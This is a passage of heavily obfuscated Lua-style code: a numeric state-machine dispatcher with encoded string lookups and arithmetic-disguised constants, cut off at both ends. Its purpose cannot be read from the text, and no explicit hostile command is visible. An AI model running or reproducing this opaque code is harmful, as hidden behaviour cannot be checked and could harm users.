p=19325521939175-(-612416)m=q[i]U=q[V]P=n[D]s=n[a]H=s(g,F)T=P[H]P=X(696939+-642301)P=U[P]X6=X(695555+-640899)V={P(U,T)}U=X(679931-625138)F=X(255962+-201123)R=X(945506+-890604)T=X(-775032-(-829786))i=m(J(V))x=563413+14221286359305 m=i()i=q[U]V=q[T]s=n[D]H=n[a]w=X(-958529-(-1013436))g=H(F,x)P=s[g]s=X(835836-781198)s=V[s]T={s(V,P)}W=8729379891732-(-828876)g=X(348252-293404)U=i(J(T))x=19541645201308-945169 i=U()e=29596568409339-(-499930)P=n[D]s=n[a]U=X(-916330-(-971108))F=128829+12247029767945 N=178866+12822624066721 H=s(g,F)T=P[H]s=n[D]H=n[a]F=X(-678345-(-732913))g=H(F,x)P=s[g]x=X(-909508+964392)H=n[D]g=n[a]F=g(x,e)s=H[F]g=n[D]e=X(-273951-(-328629))F=n[a]x=F(e,d)d=X(-242995-(-297809))H=g[x]O=163059+26068024799863 F=n[D]x=n[a]e=x(d,p)g=F[e]e=n[D]F=-281470-(-281630)d=n[a]p=d(w,h)x=e[p]p=X(-843854-(-898551))U=f[U]d=q[p]w=n[D]h=n[a]C=h(R,N)R=27005741830328-286617 p=w[C]e=d[p]N=X(364749+-309960)p=-270736-(-271316)C=X(284337+-229341)w=-331615+332075 d=e(p,w)p=n[D]w=n[a]h=w(C,R)e=p[h]p=true B6=-149804+32414372611106 h=n[D]C=n[a]R=C(N,W)w=h[R]C=n[D]j=430174+11761305945350 R=n[a]W=X(-547138+601605)N=R(W,j)h=C[N]j=X(-711504+766008)Z={}R=n[D]N=n[a]W=N(j,O)C=R[W]j=X(466414-411853)W=q[j]O=n[D]u=n[a]J6=u(X6,B6)j=O[J6]J6=X(585290+-530513)N=W[j]j=n[D]X6=606567+25765034765686 O=n[a]u=O(J6,X6)W=j[u]R=N[W]V={[T]=P;[s]=H,[g]=F;[x]=d;[e]=p,[w]=h;[C]=R}h=17909170158614-449411 g=X(-609009+663580)e=X(-43316-(-98291))d=13470802971612-586588 U=U(f,V)R=-915069+8288742933904 P=n[D]p=522601+28931832740663 F=-88310+22825400828538 s=n[a]H=s(g,F)T=P[H]g=n[D]F=n[a]x=F(e,d)w=24987886566363-(-29080)H=g[x]F=n[D]x=n[a]d=X(637372-582613)C=-321943+1783464406229 e=x(d,p)g=F[e]x=n[D]X6=10364922496195-618985 p=X(-664342-(-719168))e=n[a]d=e(p,w)P=X(548362+-493439)w=X(-673344+728230)F=x[d]e=n[D]d=n[a]p=d(w,h)w=31163199703100-708493 P=U[P]x=e[p]s={[H]=g,[F]=x}x=X(716727-662274)e=22149365469934-92836 P=P(U,s)H=n[D]g=n[a]F=g(x,e)s=H[F]p=X(-460314-(-515313))x=n[D]e=n[a]d=e(p,w)F=x[d]h=228775+31806475009076 e=n[D]j=X(-457245-(-512208))d=n[a]w=X(-699885+754850)p=d(w,h)x=e[p]d=n[D]p=n[a]h=X(552379+-497776)w=p(h,C)e=d[w]p=n[D]w=n[a]C=X(656302+-601373)h=w(C,R)d=p[h]g={[F]=x,[e]=d}H=X(131914+-76991)x=34359079016963-416644 H=U[H]H=H(U,g)V={[T]=P;[s]=H}T=S()n[T]=V d=S()s=n[D]H=n[a]e={}O=203147+21822766140967 F=X(562641-507660)g=H(F,x)P=s[g]V=f[P]F=E(-362012+13224480,{D,a})g=r(402958-(-621633),{D;a})w=v(-923855+17178222,{d})P=S()p=r(-99074+3852003,{d;D,a})J6=22572740332806-582647 H=b(11003770-(-962106),{D,a})s=l(464671+7569934,{D;a})n[P]=V V=S()n[V]=s s=S()n[s]=H H=S()n[H]=g g=S()x=b(-870601+8593885,{D,a})n[g]=F K6=642853+18481536324217 F=S()n[F]=x n[d]=e x=E(6539233-(-412743),{D;a})e=S()n[e]=p u=X(-294446-(-349237))p=S()n[p]=w h=n[T]R=n[D]N=n[a]W=N(j,O)j=X(85557+-30708)C=R[W]B6=3018349218842-378525 w=h[C]k6=48266+12715630418583 R=n[D]N=n[a]O=968310+32705748006151 W=N(j,O)C=R[W]W=n[D]j=n[a]O=j(u,J6)N=W[O]J6=X(179012-124263)j=n[D]h=X(224292-169792)O=n[a]u=O(J6,X6)X6=X(150654-95910)W=j[u]O=n[D]u=n[a]h=w[h]J6=u(X6,B6)j=O[J6]O=false R={[N]=W,[j]=O}N={}h=h(w,C,R)w=X(-426446-(-481077))C=l(437475+4931849,{e,D;a;H;p,g})w=h[w]w=w(h,C)w=b(10819345-874095,{T,D,a,e,H,p,g;V;s;F})B6=19402731612559-(-686524)J6=21792294630677-298354 R=w()C=M(16622372-285596,{T;D,a;P,e;p})R=C()R=X(938914+-884181)R=m[R]R=R(m,f)R=X(131912-77179)R=i[R]R=R(i,f)R=X(-173581+228364)R=m[R]R=R(m)u=X(759718+-704882)F=G(F)d=G(d)R=X(297333-242731)R=m[R]R=R(m,N)W=n[D]j=n[a]O=j(u,J6)C=nil X6=X(591638+-536762)N=W[O]R=X(147678-92968)R=i[R]R=R(i,N)W=n[D]R=X(-48111+102821)J6=-488085+20268593633139 j=n[a]u=X(834678-779752)O=j(u,J6)R=m[R]N=W[O]R=R(m,N)W=n[T]R=X(795171+-740309)O=n[D]I6=142040+31509210631800 R=i[R]u=n[a]B=q[X(-686450+741158)]J6=u(X6,B6)e=G(e)j=O[J6]N=W[j]X6=X(-470074-(-524590))R=R(i,N)W=n[T]O=n[D]u=n[a]B6=20431917711974-(-926404)J6=u(X6,B6)R=X(-103481+158374)j=O[J6]g=G(g)x=nil N=W[j]R=m[R]H=G(H)R=R(m,N)R=X(-572861-(-627743))p=G(p)R=U[R]N=691047-691046 R=R(U,N)j=n[D]U=nil B6=17176204928851-(-423915)J6=X(-68002-(-122754))O=n[a]h=nil X6=212236+28679241922334 u=O(J6,X6)W=j[u]O=n[D]u=n[a]i=nil X6=X(778750-723903)J6=u(X6,B6)j=O[J6]B6=X(371729-316828)u=n[D]T=G(T)J6=n[a]X6=J6(B6,k6)k6=X(749274-694751)O=u[X6]P=G(P)J6=n[D]X6=n[a]s=G(s)B6=X6(k6,I6)R=X(-560124+614650)I6=X(961908-907304)u=J6[B6]R=f[R]X6=n[D]B6=n[a]k6=B6(I6,K6)V=G(V)J6=X6[k6]X6=-464570+464578 N={[W]=j,[O]=u,[J6]=X6}R=R(f,N)R=X(311065+-256257)w=nil f=nil R=m[R]a=G(a)R=R(m)m=nil D=G(D)end end else if B<7940102-(-284019)then if B<7456870-(-733995)then a=n[I[393145+-393143]]V=960498+3626563083942 m=n[I[-925471-(-925474)]]U=X(574380+-519720)i=m(U,V)f=a[i]Z=D[f]a=n[I[-128850-(-128852)]]U=X(-689009+743699)V=73950+24204874730281 m=n[I[833559+-833556]]i=m(U,V)f=a[i]B=Z[f]f=n[I[522242-522240]]a=n[I[1016926+-1016923]]U=25186611260322-(-410158)i=X(-376511+431271)m=a(i,U)Z=f[m]f=A B[Z]=f B=11271957-(-9538)else m=f P=n[I[569799+-569798]]g=X(-971745+1026644)V=X(-346940+401589)s=n[I[706540-706538]]F=-304849+11196080667438 H=s(g,F)V=i[V]T=P[H]V=V(i,T)B=V and 5704787-91152 or 7111444-(-181607)U=V end else a,U=m(f,a)B=a and 16454722-546775 or 15677587-520701 end end end else if B<-280375+8869500 then if B<8737407-223842 then if B<-280142+8675034 then if B<733297+7622250 then D=X(-806981+861698)A=q[D]D=X(828567+-773918)a=n[I[994962-994961]]m=n[I[-197683+197685]]V=22717726307483-314185 U=X(-182654+237509)i=m(U,V)f=a[i]D=A[D]D=D(A,f)B=D and-497351+7737097 or 546187+15983407 Z=D else i=a B=X(63555-8906)T=n[I[-1030971-(-1030973)]]B=U[B]H=X(762804-708310)g=839460+25081165405819 P=n[I[-202884-(-202887)]]s=P(H,g)V=T[s]B=B(U,V)B=B and-571894+6061116 or 9006646-366734 end else if B<-247340+8752782 then B=V V=nil Z=U or V U=Z V=B B=U and 3237453-(-843715)or 2032960-(-81014)Z=U else s=14513883865273-(-194989)P=X(998556-943660)a=B U=n[I[239971+-239969]]V=n[I[842344-842341]]T=V(P,s)i=U[T]m=D[i]B=m and 6406536-463347 or-509756+12400757 f=m end end else if B<8177563-(-409117)then if B<639192+7886973 then D=nil B=1787879-(-677740)else i=X(674058-619596)B=n[I[-222387+222388]]f=n[I[83824+-83822]]a=n[I[118832-118829]]U=23742710559149-689789 m=a(i,U)D=f[m]f=b(13593429-439378,{I[266723+-266721];I[266535-266532];I[925398+-925394]})Z=B(D,f)B=11182009-(-430914)end else A=k[-808708-(-808709)]B=A and 11051736-18811 or 686813+7125291 end end else if B<8999422-309460 then if B<8540820-(-99775)then if B<8771025-132321 then B=4165065-84825 U=nil i=nil else U=nil i=nil B=5357858-(-425869)end else if B<-299024+8946884 then Z={}B=q[X(216576+-161604)]else B=7167788-351411 end end else if B<551366+8165652 then if B<9208484-513872 then B=7479746-(-1038294)else B=260937+5583424 end else A=nil Z={}B=q[X(-484797+539711)]end end end end end end end else if B<525810+12106263 then if B<10288596-(-713389)then if B<10282259-476166 then if B<8374725-(-896928)then if B<9081706-97461 then if B<8489089-(-347943)then if B<219674+8563348 then if B<562931+8194078 then f=-85973-(-86118)D=n[I[960455+-960453]]A=D*f D=-759752+6317777380165 Z=A+D A=35184372235212-146380 D=338883+-338882 B=Z%A n[I[6406-6404]]=B A=n[I[392622+-392619]]Z=A~=D B=-517220+14443234 else a=nil f=nil m=nil B=352871+7360003 end else if B<-971020+9798628 then D=X(-503350+558067)U=X(1089753-1034791)A=q[D]a=n[I[524644+-524643]]V=13500892029129-231483 D=X(34275+20374)m=n[I[-916356+916358]]i=m(U,V)f=a[i]D=A[D]D=D(A,f)Z=D B=D and-201415+5658974 or 12003188-370732 else B=296010+15064033 end end else if B<8988352-109490 then if B<418135+8433146 then B=11945911-332988 D=nil else B=m B=183853+12283848 D=a end else if B<-911703+9841872 then B=n[I[640753+-640747]]H=n[I[-105981-(-105983)]]x=X(-219739+274375)c=408461+14436575993525 g=n[I[200700+-200697]]F=g(x,c)c=26408627927440-(-390777)x=X(598588+-543901)s=H[F]P=U[s]H=n[I[181849+-181847]]g=n[I[-921991+921994]]F=g(x,c)s=H[F]T=P[s]V=B(T)B=351021+916429 else f,i=a(D,f)B=f and-154106+10426427 or-767267+16667766 end end end else if B<-51859+9256397 then if B<9585371-439817 then if B<129964+8881278 then f,i=a(D,f)B=f and-937018+15736744 or 46878+10231123 else Z=D B=f B=-760510+3179364 end else if B<519088+8648816 then F=X(831224-776702)s=n[I[-927654-(-927656)]]H=n[I[-808931+808934]]i=a x=-880456+11598803190881 g=H(F,x)P=s[g]T=X(755347+-700698)T=U[T]T=T(U,P)B=T and-894414+6246549 or 1978421-596592 V=T else e=X(470959-416480)B=911324+10757802 d=3397026001397-1043400 c=n[I[-64198-(-64199)]]t=n[I[-865170+865172]]o=t(e,d)x=c[o]F=A[x]H=F end end else if B<716294+8526381 then if B<289837+8943600 then U=X(460221-405504)i=q[U]B=9286919-211080 V=n[I[-403699+403701]]T=n[I[-428724+428727]]s=X(-782771-(-837666))H=-516164+1924657980356 P=T(s,H)U=V[P]s=10311696835330-(-929727)m=i[U]P=X(276278+-221670)U=n[I[-765781-(-765783)]]V=n[I[85992-85989]]T=V(P,s)i=U[T]a=m[i]U=n[I[-877046+877048]]V=n[I[63306+-63303]]s=16522622688729-622540 P=X(778365+-723893)T=V(P,s)m=X(-282673-(-337322))i=U[T]m=a[m]m=m(a,i)D=m else B=n[I[273504-273503]]f=n[I[567800+-567798]]i=X(-118735-(-173274))U=34836135147764-(-280169)a=n[I[669646+-669643]]m=a(i,U)D=f[m]f=E(294634+200624,{I[-510488+510490];I[-432851-(-432854)],I[1019244-1019240],I[-84205+84210]})Z=B(D,f)B=10994559-(-420929)end else B=n[I[-689263+689268]]i=X(519310-464643)f=n[I[506008+-506006]]U=-734985+27468084668671 a=n[I[869567+-869564]]m=a(i,U)D=f[m]Z=B(D)f=X(-581264-(-636018))V=2829967896843-(-742426)U=X(937516-882969)D=q[f]a=n[I[276540-276538]]m=n[I[-372572+372575]]i=m(U,V)f=a[i]Z=D[f]f=n[I[653007+-653005]]i=X(493746+-438835)U=-998833+1305332596752 a=n[I[600860-600857]]m=a(i,U)D=f[m]B=Z[D]D=B B=D and 8751884-239398 or-173876+14080881 Z=D end end end else if B<8979222-(-579493)then if B<9609589-201186 then if B<-359140+9676583 then if B<985517+8307936 then U=21025139182982-943944 B=n[I[-647240-(-647245)]]f=n[I[-902200+902202]]T=-86298+17313366143128 i=X(642242+-587432)a=n[I[647085-647082]]m=a(i,U)D=f[m]Z=B(D)f=X(-436777+491494)D=q[f]m=n[I[-1006071-(-1006073)]]i=n[I[273784-273781]]V=X(685361+-630869)U=i(V,T)a=m[U]f=X(365461-310812)f=D[f]f=f(D,a)B=f and 14440023-503059 or-148392+11933934 Z=f else x=x+d F=x<=e p=not L F=p and F p=x>=e p=L and p F=p or F p=-665238+5692116 B=F and p F=15218108-(-409156)B=B or F end else if B<616997+8753780 then B=4200063-684738 else B=q[X(243551+-188794)]Z={}end end else if B<1046553+8462484 then if B<244111+9200761 then B=true B=B and-658466+4669817 or 9434659-790854 else U=X(-1026846+1081311)s=X(-163984+218704)i=q[U]H=2212670791563-(-9339)V=n[I[736922+-736921]]T=n[I[520144-520142]]B=6224597-(-365480)P=T(s,H)U=V[P]m=i[U]U=-317816+318071 V=199182-198927 T=-150708+150708 i=m(U,V,T)Z=i end else U=not i f=f+m D=f<=a D=U and D U=f>=a U=i and U D=U or D U=15092553-(-203907)B=D and U D=10040809-(-323039)B=B or D end end else if B<10064791-387948 then if B<1021895+8598127 then if B<10279644-697608 then B=m m=Z B=m and-325393+1635693 or 484477+8274744 else i=X(-523123+577864)B=n[I[480987+-480981]]f=n[I[872973-872971]]U=23546868221763-(-910225)a=n[I[-251881-(-251884)]]T=313349+24772006896906 m=a(i,U)V=X(1075432-1020917)D=f[m]Z=B(D)f=X(-902426+957143)D=q[f]m=n[I[-794103-(-794105)]]i=n[I[-217128+217131]]f=X(-146016+200665)U=i(V,T)f=D[f]a=m[U]f=f(D,a)Z=f B=f and 13256317-(-682763)or 141371+6182687 end else if B<8848982-(-804776)then Z={}B=q[X(277574+-222623)]A=nil else U=15825+26693023085244 i=X(1282-(-53223))f=n[I[-1028249-(-1028250)]]a=n[I[540840-540838]]m=a(i,U)B=X(-988039+1042739)B=A[B]Z=f[m]B=B(A,Z)B=B and 16663589-43873 or 9369393-(-431347)end end else if B<10353970-561690 then if B<290789+9437223 then T=X(927698+-872981)V=q[T]P=n[I[1047137+-1047136]]F=25561965323977-407626 g=X(-554159+608917)s=n[I[994659+-994657]]H=s(g,F)T=P[H]B=805110+9197236 U=V[T]g=743248+3570064912174 T=n[I[-613212+613213]]H=X(-9413-(-64184))P=n[I[-268762-(-268764)]]s=P(H,g)V=T[s]i=U[V]s=X(-593467+648180)V=n[I[770164-770163]]T=n[I[-868214+868216]]H=34725353830604-(-345694)P=T(s,H)H=28958989256826-(-617523)U=V[P]m=i[U]V=n[I[455478+-455477]]T=n[I[-508808-(-508810)]]i=X(-225146-(-279795))s=X(-163124-(-217644))i=m[i]P=T(s,H)U=V[P]i=i(m,U)f=i else B=6620297-(-140418)i=nil m=nil end else f=X(945487+-890950)Z=q[f]U=X(-940886+995750)V=5492483818756-686855 a=n[I[-846259-(-846260)]]m=n[I[386204+-386202]]i=m(U,V)f=a[i]B=Z[f]a=n[I[730531+-730530]]m=n[I[591896-591894]]V=-213895+25292873445768 U=X(-36030+90724)i=m(U,V)U=-852018+22552188250423 f=a[i]Z=B(f)i=X(-978863-(-1033536))f=Z Z=n[I[815036-815035]]a=n[I[375476-375474]]m=a(i,U)B=Z[m]Z=D a=B B=D and 7004219-414142 or 9072449-(-435512)end end end end else if B<589205+9755247 then if B<-46465+10048932 then if B<-972755+10888101 then if B<9392751-(-490456)then if B<-416043+10290261 then i=X(669886-614950)D=X(-187183-(-241937))U=34068064397876-(-840644)A=q[D]f=n[I[670810+-670809]]a=n[I[109490+-109488]]m=a(i,U)D=f[m]Z=A[D]i=4374045242969-798309 D=n[I[-303856-(-303857)]]f=n[I[585791-585789]]m=X(-746050-(-800748))a=f(m,i)A=D[a]B=Z[A]A=B B=A and 13079823-(-914930)or 12765551-815566 Z=A else B=n[I[-2066-(-2069)]]P=n[I[-242852-(-242853)]]g=X(-868469+922953)F=-431564+7070262846120 s=n[I[-82344-(-82346)]]H=s(g,F)T=P[H]V=i[T]U=B(V)B=260948+11247918 end else if B<9185917-(-721142)then D=B T=X(433101+-378507)m=X(-201415-(-256132))P=512471968191-(-907055)a=q[m]i=n[I[490670-490669]]U=n[I[-930682-(-930684)]]V=U(T,P)m=i[V]P=-11209+18619127303591 T=X(-891939-(-946522))f=a[m]i=n[I[-943287-(-943288)]]a=X(-550269+604918)U=n[I[811417+-811415]]a=f[a]V=U(T,P)m=i[V]a=a(f,m)B=a and 476987+12154591 or-428371+1068368 A=a else f,i=a(D,f)B=f and-523723+8284430 or 12269832-55668 end end else if B<10622996-656460 then if B<10856365-918259 then T=S()P=-620098-(-620101)n[T]=Z B=n[U]s=-878963+879028 g=X(899729+-844824)Z=B(P,s)P=S()n[P]=Z B=-458385-(-458385)o=X(-233683-(-288191))s=B F=l(771703+595746,{})B=723189+-723189 H=B Z=q[g]g={Z(F)}B={J(g)}Z=163569-163567 g=B B=g[Z]Z=X(824998-770157)F=B B=q[Z]x=n[f]t=q[o]o=t(F)t=X(806945+-751968)c=x(o,t)x={c()}Z=B(J(x))x=S()n[x]=Z B=926351+-923495 c=n[P]t=c c=280391-280390 Z=729208+-729207 o=c c=896731-896731 e=o<c c=Z-o else Z=n[I[-171046+171047]]i=22177999406102-(-861249)V=8026798775863-(-946274)D=n[I[467094-467092]]f=n[I[779656-779653]]m=X(49944-(-4796))P=-323123+34678699224391 a=f(m,i)A=D[a]B=Z[A]D=n[I[827535-827533]]U=X(-914318+969098)T=19699377637290-500693 Z=X(-641895+696395)m=X(301289+-246439)i=-982948+12105960117673 f=n[I[-996245-(-996248)]]a=f(m,i)A=D[a]a=n[I[-322018+322020]]m=n[I[128381+-128378]]i=m(U,V)V=X(886331-831612)f=a[i]m=n[I[216728-216726]]i=n[I[-838304-(-838307)]]U=i(V,T)T=X(573596+-518961)a=m[U]i=n[I[29841-29839]]U=n[I[855018+-855015]]V=U(T,P)Z=B[Z]m=i[V]i=false D={[f]=a,[m]=i}s=-907058+10511859755600 Z=Z(B,A,D)B=X(-711335-(-765966))i=X(-601967-(-656946))U=-822281+16532096952859 A=Z Z=Y(14048766-305395,{I[478717+-478713];I[-799368+799370],I[30568-30565];I[-1027633+1027638],I[445412+-445406];I[-198850-(-198857)]})V=X(-693236+747922)B=A[B]T=-625466+28190567005825 B=B(A,Z)Z=n[I[-512331-(-512332)]]f=n[I[912487+-912485]]a=n[I[-934761-(-934764)]]m=a(i,U)D=f[m]B=Z[D]f=n[I[502823-502821]]a=n[I[606478-606475]]i=X(-83348+138319)U=22915121211905-(-262061)m=a(i,U)D=f[m]m=n[I[-1018165+1018167]]i=n[I[671068+-671065]]H=288302+32008678233099 U=i(V,T)a=m[U]P=2770422371564-331746 i=n[I[895947+-895945]]T=X(-23616+78202)U=n[I[715803-715800]]V=U(T,P)m=i[V]U=n[I[164043-164041]]P=X(222522+-167647)Z=X(-670456-(-724956))V=n[I[250062+-250059]]T=V(P,s)p=24486620753431-(-491123)i=U[T]V=30202277335966-629934 F=-372906+1487427810142 U=false f={[a]=m;[i]=U}Z=B[Z]Z=Z(B,D,f)d=3592780516169-378048 B=X(51315+3316)D=Z B=D[B]U=X(-214029-(-268578))Z=v(-614941+6697078,{I[165533+-165529],I[875748-875746];I[654623-654620],I[263337-263332];I[-503453+503459];I[487469-487462]})s=10091443621835-(-901776)B=B(D,Z)Z=n[I[-564575-(-564576)]]a=n[I[-435588-(-435590)]]m=n[I[627140-627137]]i=m(U,V)V=425846+21299504555848 f=a[i]U=X(558156-503410)B=Z[f]a=n[I[15989-15987]]m=n[I[-473067-(-473070)]]i=m(U,V)T=X(50213-(-4245))f=a[i]i=n[I[-294070+294072]]U=n[I[45963+-45960]]P=1523365940652-461543 V=U(T,P)m=i[V]P=X(-994024+1048634)e=-181488+25101835104920 U=n[I[1028366+-1028364]]V=n[I[-71922+71925]]T=V(P,s)s=X(-937716+992548)i=U[T]Z=X(888734+-834234)Z=B[Z]V=n[I[-961908-(-961910)]]T=n[I[1031288+-1031285]]P=T(s,H)U=V[P]V=false T=33230572842298-520392 a={[m]=i,[U]=V}Z=Z(B,f,a)f=Z Z=Y(10815268-(-463953),{I[-488796+488800];I[-926556-(-926558)],I[-314030-(-314033)];I[198871-198866],I[-524920+524926],I[-895484+895491]})B=X(-441179+495810)B=f[B]V=X(-696683+751139)g=25605400999943-543092 B=B(f,Z)Z=n[I[749048+-749047]]m=n[I[-820716+820718]]i=n[I[558066-558063]]U=i(V,T)T=-422448+30587496278483 V=X(78338-23766)P=X(-479792-(-534328))a=m[U]B=Z[a]m=n[I[-217160-(-217162)]]i=n[I[114759-114756]]U=i(V,T)a=m[U]s=495315427994-(-466508)U=n[I[344959+-344957]]V=n[I[-303439+303442]]T=V(P,s)H=-357739+12200195443612 i=U[T]s=X(-905953-(-960503))V=n[I[-459903+459905]]T=n[I[724126-724123]]Z=X(-759561-(-814061))P=T(s,H)U=V[P]T=n[I[-599517+599519]]P=n[I[310755-310752]]H=X(-721925+776745)s=P(H,g)V=T[s]T=false Z=B[Z]m={[i]=U,[V]=T}Z=Z(B,a,m)B=X(757629-702998)a=Z B=a[B]D=nil Z=Y(-251862+971611,{I[-575045-(-575049)],I[316729-316727],I[574116-574113];I[-432472-(-432480)];I[412565+-412559];I[-617053-(-617062)]})B=B(a,Z)P=34962661793194-564754 H=-115348+7757117313200 c=153459+7799797397181 Z=n[I[-997642-(-997643)]]i=n[I[943215+-943213]]T=X(-308788-(-363247))U=n[I[-684639-(-684642)]]V=U(T,P)m=i[V]B=Z[m]s=X(-142055-(-196907))i=n[I[922193-922191]]T=X(26274+28580)P=15152507863161-(-760598)U=n[I[-839867+839870]]V=U(T,P)m=i[V]V=n[I[141956-141954]]T=n[I[-456683+456686]]Z=X(99624+-45124)P=T(s,H)H=X(670522-615553)U=V[P]T=n[I[-745871+745873]]g=24859454612788-(-755716)P=n[I[963331+-963328]]s=P(H,g)V=T[s]g=X(309582-254711)P=n[I[-581422+581424]]s=n[I[455897-455894]]H=s(g,F)T=P[H]Z=B[Z]P=false i={[U]=V,[T]=P}Z=Z(B,m,i)m=Z B=X(-831671-(-886302))B=m[B]F=444926+3889948359957 Z=v(-384621+7677330,{I[712726-712722],I[149166-149164];I[912590-912587],I[-597675-(-597683)];I[160423+-160417],I[-574528+574537]})x=-331679+9846935953800 B=B(m,Z)i=n[I[444103-444101]]g=-813147+19177340537661 T=X(647390+-592408)U=n[I[470166-470163]]P=11420221635056-(-891605)V=U(T,P)s=14214865431929-(-109666)Z=i[V]U=n[I[-84348-(-84350)]]V=n[I[166589-166586]]P=X(-639988+694631)T=V(P,s)H=-559061+6376765412206 i=U[T]V=n[I[220055+-220053]]s=X(28717+25987)T=n[I[207870+-207867]]P=T(s,H)U=V[P]H=X(943279+-888758)T=n[I[-697482-(-697484)]]P=n[I[386154+-386151]]s=P(H,g)g=X(441567-387015)V=T[s]P=n[I[352551+-352549]]s=n[I[144236-144233]]H=s(g,F)T=P[H]B={Z,i;U,V,T}s=X(630615-576004)i=S()n[i]=B Z=n[I[-465004+465005]]V=n[I[-274191+274193]]T=n[I[-18914+18917]]H=-964311+7864193254693 g=X(-628538+683122)P=T(s,H)H=-213376+24980657352432 F=24152528083543-142953 U=V[P]s=X(-730392-(-785046))B=Z[U]V=n[I[601374+-601372]]T=n[I[-916029-(-916032)]]Z=X(-497119+551619)P=T(s,H)Z=B[Z]U=V[P]P=n[I[90817+-90815]]s=n[I[-943277+943280]]H=s(g,F)F=X(-95898+150719)T=P[H]s=n[I[953364-953362]]H=n[I[-611799-(-611802)]]g=H(F,x)x=X(-971670+1026425)P=s[g]H=n[I[486197-486195]]g=n[I[-851960+851963]]t=32453326240076-605764 F=g(x,c)s=H[F]g=14220696117490-722708 H=false V={[T]=P,[s]=H}Z=Z(B,U,V)U=Z Z=Y(12679197-846901,{I[-227445+227449],I[628857-628855],I[531640+-531637];i,I[-64609+64614];I[-578547+578553];I[-722902+722909]})H=X(-206107+260812)B=X(-9586+64217)B=U[B]A=nil B=B(U,Z)Z=n[I[98275+-98274]]T=n[I[-738055+738057]]P=n[I[160358+-160355]]s=P(H,g)V=T[s]m=nil H=X(278612-224127)B=Z[V]g=1176081351055-687980 T=n[I[22970+-22968]]F=X(-1021237+1075972)P=n[I[295473+-295470]]s=P(H,g)V=T[s]x=5100482050551-454832 s=n[I[337161+-337159]]H=n[I[-287546+287549]]g=H(F,x)x=X(-945884-(-1000765))P=s[g]c=20574453608217-674221 H=n[I[423983-423981]]g=n[I[-455934-(-455937)]]Z=X(761011+-706511)F=g(x,c)s=H[F]g=n[I[61243-61241]]Z=B[Z]c=X(607003-552370)F=n[I[972908-972905]]x=F(c,t)H=g[x]g=false T={[P]=s;[H]=g}Z=Z(B,V,T)x=19251947818512-633612 V=Z g=21268038307321-763722 Z=M(846793+15129965,{I[-161945+161949];I[-242125-(-242127)],I[-76238-(-76241)],I[-837377-(-837385)];I[-662336-(-662342)];I[-814990+814999]})B=X(820498+-765867)H=X(525993+-471338)B=V[B]B=B(V,Z)L=78973+13421334979564 T=n[I[-670216-(-670218)]]P=n[I[-570933-(-570936)]]s=P(H,g)Z=T[s]g=X(974321-919596)P=n[I[-572411-(-572413)]]s=n[I[475252+-475249]]F=1992022459862-688695 t=-393470+22294425840011 H=s(g,F)T=P[H]V=nil c=X(124398+-69801)F=X(-276391+331147)s=n[I[354096-354094]]H=n[I[-899861-(-899864)]]g=H(F,x)P=s[g]B={Z,T;P}T=S()n[T]=B x=32115880784607-(-460684)F=X(653713+-599047)Z=n[I[665079+-665078]]s=n[I[-495767-(-495769)]]H=n[I[-705341+705344]]g=H(F,x)x=7644468519137-(-371974)F=X(-1039550+1094265)P=s[g]B=Z[P]s=n[I[260294+-260292]]H=n[I[-863399+863402]]g=H(F,x)P=s[g]g=n[I[468997-468995]]F=n[I[-95202-(-95205)]]Z=X(-630638-(-685138))o=-459123+3243136649049 x=F(c,t)H=g[x]t=X(908146+-853533)F=n[I[-305978-(-305980)]]x=n[I[359668+-359665]]c=x(t,o)g=F[c]o=X(692033-637356)x=n[I[381365+-381363]]c=n[I[-401657+401660]]t=c(o,e)F=x[t]x=false Z=B[Z]t=X(-567074+621547)s={[H]=g,[F]=x}Z=Z(B,P,s)c=-234422+13011752512353 P=Z B=X(299720+-245089)Z=l(119021+11427542,{I[-533093+533097],I[-512514-(-512516)],I[-629651+629654],T;I[557304+-557299];I[489493+-489487];I[768775-768768]})B=P[B]x=X(408435-353892)B=B(P,Z)Z=n[I[1042980-1042979]]H=n[I[877217-877215]]g=n[I[852539-852536]]F=g(x,c)s=H[F]B=Z[s]H=n[I[533427+-533425]]x=X(-576317+631221)g=n[I[44034+-44031]]Z=X(345752-291252)c=5456754526165-736745 Z=B[Z]F=g(x,c)o=-774761+3012529477603 s=H[F]F=n[I[-739587+739589]]x=n[I[575849+-575846]]c=x(t,o)g=F[c]e=398128+27660125265696 x=n[I[608885-608883]]c=n[I[308907+-308904]]o=X(-136725-(-191426))t=c(o,e)e=X(909271+-854310)F=x[t]c=n[I[510483-510481]]t=n[I[-890702-(-890705)]]P=nil o=t(e,d)x=c[o]t=22242400642323-(-852834)c=false H={[g]=F,[x]=c}d=409994+5798978963714 Z=Z(B,s,H)s=Z U=nil B=X(27478+27153)B=s[B]Z=E(-270797+11609929,{I[-799621+799625],I[232062-232060];I[593425-593422],I[424490-424482],I[28504+-28498];I[-902154-(-902163)]})B=B(s,Z)Z=n[I[354835+-354834]]e=947113+13630485505314 g=n[I[437289-437287]]F=n[I[-657476-(-657479)]]c=X(-444165-(-498626))x=F(c,t)H=g[x]B=Z[H]c=X(458853-403893)o=X(-286941+341617)g=n[I[-146672-(-146674)]]F=n[I[236677-236674]]t=24952110761676-366953 x=F(c,t)H=g[x]x=n[I[-343967+343969]]c=n[I[-537229-(-537232)]]t=c(o,e)e=X(17941-(-36541))F=x[t]c=n[I[879794-879792]]t=n[I[16029-16026]]o=t(e,d)x=c[o]d=X(1031309-976829)t=n[I[133252-133250]]o=n[I[214815-214812]]Z=X(-960000+1014500)e=o(d,L)c=t[e]t=false T=G(T)o=28586084377970-(-331405)Z=B[Z]s=nil g={[F]=x,[c]=t}Z=Z(B,H,g)H=Z t=X(-543392+598134)i=G(i)Z=v(918470-623766,{I[944910-944906],I[-497331+497333];I[-618361-(-618364)],I[-11936+11946],I[382272-382266]})B=X(-553259+607890)B=H[B]B=B(H,Z)Z=n[I[-565999+566000]]F=n[I[-1047033+1047035]]a=nil L=-899711+1142587374739 x=n[I[-157783+157786]]c=x(t,o)g=F[c]B=Z[g]F=n[I[394120-394118]]o=22736609017025-(-93338)d=15398105443441-(-1027985)t=X(805152+-750413)x=n[I[236786+-236783]]c=x(t,o)e=X(-204721+259253)g=F[c]c=n[I[-754026-(-754028)]]t=n[I[547303-547300]]o=t(e,d)d=X(415104+-360164)x=c[o]t=n[I[848206-848204]]o=n[I[-927827-(-927830)]]f=nil e=o(d,L)c=t[e]o=n[I[954342+-954340]]e=n[I[-1022717+1022720]]L=X(-1013396+1068274)H=nil d=e(L,p)t=o[d]o=false F={[x]=c;[t]=o}Z=X(894569-840069)Z=B[Z]Z=Z(B,g,F)g=Z 